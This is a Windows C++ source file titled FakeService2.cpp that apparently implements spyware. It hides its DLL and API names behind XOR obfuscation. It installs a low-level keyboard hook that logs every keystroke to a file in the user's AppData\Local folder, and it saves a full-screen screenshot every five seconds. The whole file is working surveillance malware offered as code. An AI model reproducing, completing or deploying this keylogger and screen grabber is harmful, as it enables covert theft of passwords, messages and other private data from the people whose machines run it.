// FakeService2.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "pch.h"
#include <iostream>

// FakeService.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "pch.h"
#include <iostream>
#include <windows.h>
#include <stdlib.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <string>
#include <shlwapi.h>
#include <comdef.h>
#include <sstream>
#include <vector>
#include <wingdi.h>
#include <time.h>
#include <Shlobj.h> 

using namespace std;


#ifndef _CRT_STRINGIZE  // Might be already defined in crtdefs.h, but if not...
#define __CRT_STRINGIZE(Value) #Value
#define _CRT_STRINGIZE(Value) __CRT_STRINGIZE(Value)
#endif

HHOOK hook;

BOOL checkTiming(time_t start) {
	double seconds_since_start = difftime(time(0), start);
	if (seconds_since_start > 1) {
		return TRUE;
	}
	return FALSE;
}

string encryptDecrypt(string toEncrypt) {
	string output = toEncrypt;

	for (int i = 0; i < toEncrypt.size(); i++)
		output[i] = toEncrypt[i] ^ 0x5a;

	return output;
}

void error(DWORD retval) {
	_com_error error(retval);
	wcout << error.ErrorMessage() << endl;
}

class ProcPtr {
public:
	explicit ProcPtr(FARPROC ptr) : _ptr(ptr) {}

	template <typename T, typename = std::enable_if_t<std::is_function_v<T>>>
	operator T *() const {
		return reinterpret_cast<T *>(_ptr);
	}

private:
	FARPROC _ptr;
};

class DllHelper {
public:
	explicit DllHelper(LPCSTR filename) : _module(LoadLibraryA(filename)) {}

	~DllHelper() { FreeLibrary(_module); }

	ProcPtr operator[](LPCSTR proc_name) const {
		return ProcPtr(GetProcAddress(_module, proc_name));
	}

	static HMODULE _parent_module;

private:
	HMODULE _module;
};


class DllAdvapi {
	string advapi = "\x1b\x3e\x2c\x3b\x2a\x33\x69\x68\x74\x3e\x36\x36\x5a";
	DllHelper _dll{ encryptDecrypt(advapi).c_str() };

public:
	//decltype(ShellAboutA) *shellAbout = _dll[""];
	string rsva = "\x8\x3f\x3d\x9\x3f\x2e\xc\x3b\x36\x2f\x3f\x1b";
	string rokea = "\x8\x3f\x3d\x15\x2a\x3f\x34\x11\x3f\x23\x1f\x22\x1b";
	string reka = "\x8\x3f\x3d\x1f\x34\x2f\x37\x11\x3f\x23\x1b";
	string rgva = "\x8\x3f\x3d\x1d\x3f\x2e\xc\x3b\x36\x2f\x3f\x1b";
	string rskva = "\x8\x3f\x3d\x9\x3f\x2e\x11\x3f\x23\xc\x3b\x36\x2f\x3f\x1b";
	decltype(RegSetValueA) *regSetValueA = _dll[encryptDecrypt(rsva).c_str()];
	decltype(RegOpenKeyExA) *regOpenKeyExA = _dll[encryptDecrypt(rokea).c_str()];
	decltype(RegEnumKeyA) *regEnumKeyA = _dll[encryptDecrypt(reka).c_str()];
	decltype(RegGetValueA) *regGetValueA = _dll[encryptDecrypt(rgva).c_str()];
	decltype(RegSetKeyValueA) *regSetKeyValueA = _dll[encryptDecrypt(rskva).c_str()];

};

class DllKernel {
	string kernel = "\x11\x3f\x28\x34\x3f\x36\x69\x68\x74\x3e\x36\x36\x5a";
	DllHelper _dll{ encryptDecrypt(kernel).c_str() };

public:
	string mfea = "\x17\x35\x2c\x3f\x1c\x33\x36\x3f\x1f\x22\x1b";
	string gcda = "\x1d\x3f\x2e\x19\x2f\x28\x28\x3f\x34\x2e\x1e\x33\x28\x3f\x39\x2e\x35\x28\x23\x1b";
	string wf = "\xd\x28\x33\x2e\x3f\x1c\x33\x36\x3f";
	string cfw = "\x19\x28\x3f\x3b\x2e\x3f\x1c\x33\x36\x3f\xd";
	//string gcdw = "\x1d\x3f\x2e\x19\x2f\x28\x28\x3f\x34\x2e\x1e\x33\x28\x3f\x39\x2e\x35\x28\x23";
	string gcdw = "\x1d\x3f\x2e\x19\x2f\x28\x28\x3f\x34\x2e\x1e\x33\x28\x3f\x39\x2e\x35\x28\x23\xd";
	string ch = "\x19\x36\x35\x29\x3f\x12\x3b\x34\x3e\x36\x3f";

	decltype(MoveFileExA) *moveFileExA = _dll[encryptDecrypt(mfea).c_str()];
	decltype(GetCurrentDirectoryA) *getCurrentDirectoryA = _dll[encryptDecrypt(gcda).c_str()];
	decltype(GetCurrentDirectoryW) *getCurrentDirectoryW = _dll[encryptDecrypt(gcdw).c_str()];
	decltype(WriteFile) *writeFile = _dll[encryptDecrypt(wf).c_str()];
	decltype(CreateFileW) *createFileW = _dll[encryptDecrypt(cfw).c_str()];
	decltype(CloseHandle) *closeHandle = _dll[encryptDecrypt(ch).c_str()];
};

class DllShell {
	string shell = "\x9\x32\x3f\x36\x36\x69\x68\x74\x3e\x36\x36";
	DllHelper _dll{ encryptDecrypt(shell).c_str() };

public:
	string shgfp = "\x9\x12\x1d\x3f\x2e\x1c\x35\x36\x3e\x3f\x28\xa\x3b\x2e\x32\x1b";
	decltype(SHGetFolderPathA) *sHGetFolderPathA = _dll[encryptDecrypt(shgfp).c_str()];
};

class DllUser32 {
	string user = "\xf\x29\x3f\x28\x69\x68\x74\x3e\x36\x36";
	DllHelper _dll{ encryptDecrypt(user).c_str() };
public:
	string gm = "\x1d\x3f\x2e\x17\x3f\x29\x29\x3b\x3d\x3f";
	string swhew = "\x9\x3f\x2e\xd\x33\x34\x3e\x35\x2d\x29\x12\x35\x35\x31\x1f\x22\xd";
	string cnhew = "\x19\x3b\x36\x36\x14\x3f\x22\x2e\x12\x35\x35\x31\x1f\x22";
	decltype(GetMessage) *getMessage = _dll[encryptDecrypt(gm).c_str()];
	decltype(SetWindowsHookExW) *setWindowsHookExW = _dll[encryptDecrypt(swhew).c_str()];
	decltype(CallNextHookEx) *callNextHookEx = _dll[encryptDecrypt(cnhew).c_str()];
};

class DllGdi32 {
	string gdi = "\x1d\x3e\x33\x69\x68\x74\x3e\x36\x36";
	DllHelper _dll{ encryptDecrypt(gdi).c_str() };
public:
	string gco = "\x1d\x3f\x2e\x19\x2f\x28\x28\x3f\x34\x2e\x15\x38\x30\x3f\x39\x2e";
	string gow = "\x1d\x3f\x2e\x15\x38\x30\x3f\x39\x2e\xd";
	string delobj = "\x1e\x3f\x36\x3f\x2e\x3f\x15\x38\x30\x3f\x39\x2e";
	string dc = "\x1e\x3f\x36\x3f\x2e\x3f\x1e\x19";
	string rc = "\x8\x3f\x36\x3f\x3b\x29\x3f\x1e\x19";
	decltype(GetCurrentObject) *getCurrentObject = _dll[encryptDecrypt(gco).c_str()];
	decltype(GetObjectW) *getObjectW = _dll[encryptDecrypt(gow).c_str()];
	//decltype(DeleteObject) *deleteObject = _dll[encryptDecrypt(delobj).c_str()];
	decltype(DeleteDC) *deleteDC = _dll[encryptDecrypt(dc).c_str()];
	decltype(ReleaseDC) *releaseDC = _dll[encryptDecrypt(rc).c_str()];
};
LRESULT __stdcall Callback(int nCode, WPARAM wParam, LPARAM lParam) {
	char ch;
	DllUser32 dlluser32;
	DWORD processID = GetCurrentProcessId();
	string homepath = encryptDecrypt("\x12\x15\x17\x1f\xa\x1b\xe\x12");
	string home_dir = getenv(homepath.c_str());
	string start = encryptDecrypt("\x19\x60\x6\x6");
	string file_loc = start;
	FILE *f;
	file_loc.append(home_dir);
	string temp_t = encryptDecrypt("\x6\x6\x1b\x2a\x2a\x3e\x3b\x2e\x3b\x6\x6\x16\x35\x39\x3b\x36\x6\x6");
	file_loc.append(temp_t);
	file_loc.append(to_string(processID));
	string temp_t2 = encryptDecrypt("\x74\x2e\x22\x2e");
	file_loc.append(temp_t2);
	if (((DWORD)lParam & 0x40000000) && (HC_ACTION == nCode))
	{
		if ((wParam == VK_SPACE) || (wParam == VK_RETURN) || (wParam >= 0x2f) && (wParam <= 0x100))
		{
			fopen_s(&f, file_loc.c_str(), "a+");
			if (wParam == VK_RETURN)
			{
				ch = '\n';
				fwrite(&ch, 1, 1, f);
			}
			else
			{
				BYTE ks[256];
				GetKeyboardState(ks);

				WORD w;
				UINT scan = 0;
				ToAscii(wParam, scan, ks, &w, 0);
				ch = char(w);
				fwrite(&ch, 1, 1, f);
			}
			fclose(f);
		}
	}
	//HHOOK hkb = SetWindowsHookEx(WH_KEYBOARD, (HOOKPROC)keyboardProc, GetCurrentModuleHandle(), 0);
	LRESULT RetVal = dlluser32.callNextHookEx(hook, nCode, wParam, lParam);
	return  RetVal;
}

void InstallHook()
{
	DllUser32 dlluser32;
	if (!(hook = dlluser32.setWindowsHookExW(WH_KEYBOARD_LL, Callback, NULL, 0))) {
		//cout << "Failed to hook!" << endl;
	}
	else {
		//cout << "Hooked!" << endl;
	}
}

int main() {
	InstallHook();
	DllKernel dllkernel;
	DllAdvapi dlladvapi;
	DllShell dllshell;
	DllUser32 dlluser32;
	DllGdi32 dllgdi32;
	MSG msg;
	BOOL allocated = FALSE;
	BYTE *bBits = NULL;
	while (TRUE) {
		//cout << "Working on Message!" << endl;
		BITMAPFILEHEADER bfHeader;
		BITMAPINFOHEADER biHeader;
		BITMAPINFO bInfo;
		HGDIOBJ hTempBitmap;
		HBITMAP hBitmap;
		BITMAP bAllDesktops;
		HDC hDC, hMemDC;
		LONG lWidth, lHeight;



		//HANDLE hHeap = GetProcessHeap();
		DWORD cbBits, dwWritten = 0;
		HANDLE hFile;

		ZeroMemory(&bfHeader, sizeof(BITMAPFILEHEADER));
		ZeroMemory(&biHeader, sizeof(BITMAPINFOHEADER));
		ZeroMemory(&bInfo, sizeof(BITMAPINFO));
		ZeroMemory(&bAllDesktops, sizeof(BITMAP));

		hDC = GetDC(NULL);
		hTempBitmap = dllgdi32.getCurrentObject(hDC, OBJ_BITMAP);
		dllgdi32.getObjectW(hTempBitmap, sizeof(BITMAP), &bAllDesktops);

		lWidth = bAllDesktops.bmWidth;
		lHeight = bAllDesktops.bmHeight;

		DeleteObject(hTempBitmap);

		bfHeader.bfType = (WORD)('B' | ('M' << 8));
		bfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
		biHeader.biSize = sizeof(BITMAPINFOHEADER);
		biHeader.biBitCount = 24;
		biHeader.biCompression = BI_RGB;
		biHeader.biPlanes = 1;
		biHeader.biWidth = lWidth;
		biHeader.biHeight = lHeight;

		bInfo.bmiHeader = biHeader;

		cbBits = (((24 * lWidth + 31)&~31) / 8) * lHeight;
		//bBits = (BYTE *)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, cbBits);
		if (allocated == FALSE) {
			bBits = (BYTE *)malloc(cbBits);
			allocated = TRUE;
		}
		//ZeroMemory(bBits, cbBits);
		if (bBits == NULL)
		{
			//MessageBoxW(NULL, L"Out of memory", L"Error", MB_OK | MB_ICONSTOP);
			return FALSE;
		}

		hMemDC = CreateCompatibleDC(hDC);
		hBitmap = CreateDIBSection(hDC, &bInfo, DIB_RGB_COLORS, (VOID **)&bBits, NULL, 0);
		SelectObject(hMemDC, hBitmap);
		BitBlt(hMemDC, 0, 0, lWidth, lHeight, hDC, 0, 0, SRCCOPY);


		TCHAR cwd[MAX_PATH];
		dllkernel.getCurrentDirectoryW(MAX_PATH, cwd);
		wstring fullpath(cwd);
		wstring filename = L"\\picture";

		fullpath.append(filename);
		//wcout << fullpath << endl;
		hFile = dllkernel.createFileW(fullpath.c_str(), GENERIC_WRITE | GENERIC_READ, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		dllkernel.writeFile(hFile, &bfHeader, sizeof(BITMAPFILEHEADER), &dwWritten, NULL);
		dllkernel.writeFile(hFile, &biHeader, sizeof(BITMAPINFOHEADER), &dwWritten, NULL);
		dllkernel.writeFile(hFile, bBits, cbBits, &dwWritten, NULL);

		dllkernel.closeHandle(hFile);

		//HeapFree(hHeap, 0, bBits);

		//bBits = NULL;
		DeleteDC(hMemDC);
		ReleaseDC(NULL, hDC);
		DeleteObject(hBitmap);
		//free((BYTE *)bBits);

		Sleep(5000);

	}
	return 0;
}





